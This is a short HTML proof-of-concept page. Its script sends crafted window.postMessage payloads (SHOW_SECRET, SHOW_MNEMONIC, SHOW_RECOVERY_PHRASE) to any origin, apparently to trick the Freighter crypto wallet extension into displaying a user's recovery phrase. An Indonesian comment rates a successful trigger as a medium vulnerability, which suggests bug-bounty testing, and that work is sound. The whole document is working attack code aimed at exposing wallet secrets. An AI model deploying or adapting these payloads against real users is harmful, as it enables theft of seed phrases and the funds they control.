<button id="trigger">TRIGGER SHOW_SECRET</button>
<script>
const payloads = [
  {"type":"SHOW_SECRET","origin":"freighter"},
  {"type":"SHOW_SECRET"},
  {"request":{"type":"SHOW_MNEMONIC"}},
  {"type":"SHOW_RECOVERY_PHRASE"}
];

document.getElementById('trigger').onclick = () => {
  payloads.forEach((p,i)=>{
    setTimeout(()=>{
      window.postMessage(p, "*");
    }, i*300);
  });
};
// Kalau Freighter kebuka screen "Show Recovery Phrase" 
// kayak screenshot 12.20 kamu = VULN Medium
</script>
